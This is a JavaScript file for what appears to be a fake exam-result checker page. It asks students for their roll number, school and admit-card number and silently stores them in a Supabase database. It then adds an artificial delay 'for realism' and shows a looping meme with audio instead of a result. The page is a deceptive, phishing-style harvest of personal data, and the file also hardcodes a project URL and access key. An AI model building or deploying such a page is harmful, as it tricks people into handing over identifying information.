import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'

// 🔑 Supabase connection
const supabase = createClient(
  'https://lfdtxuzewghjyxyrhdua.supabase.com',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxmZHR4dXpld2doanl4eXJoZHVhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc0NzI0MDksImV4cCI6MjA5MzA0ODQwOX0.DdOqAgfwhcQJka0P-HVYx9QeAp0eOAXBYqvMZj5Ms7I' // ← keep your anon key here
)

// 🎯 Elements
const form = document.getElementById('resultForm');
const loading = document.getElementById('loading');
const overlay = document.getElementById('memeOverlay');
const audio = document.getElementById('memeAudio');

// ⏱ Delay for realism
const DELAY = 1500;

// 🚀 Form submit
form.addEventListener('submit', async function (e) {
  e.preventDefault();

  const roll   = document.getElementById('roll').value.trim();
  const school = document.getElementById('school').value.trim();
  const admit  = document.getElementById('admit').value.trim();

  if (!roll || !school || !admit) {
    alert('Please fill all fields as given on your admit card.');
    return;
  }

  // 🔄 Show loading
  loading.classList.add('show');

  // 📡 Send data to Supabase
  const { data, error } = await supabase
    .from('results')
    .insert([{ roll, school, admit }]);

  console.log("DATA:", data);
  console.log("ERROR:", error);

  // ⏳ Delay before meme
  setTimeout(() => {
    loading.classList.remove('show');
    showMeme();
  }, DELAY);
});

// 🎭 Show meme
function showMeme() {
  overlay.classList.add('show');

  try {
    audio.loop = true;
    audio.muted = false;
    audio.volume = 1.0;
    audio.currentTime = 0;

    const playPromise = audio.play();

    if (playPromise !== undefined) {
      playPromise.catch(() => {
        // fallback if autoplay blocked
        document.addEventListener('click', () => audio.play(), { once: true });
      });
    }
  } catch (e) {
    console.log("Audio error:", e);
  }
}

// ❌ Close meme overlay on click
overlay.addEventListener('click', function () {
  overlay.classList.remove('show');
});

// ⌨️ Close on ESC
document.addEventListener('keydown', function (e) {
  if (e.key === 'Escape') {
    overlay.classList.remove('show');
  }
});
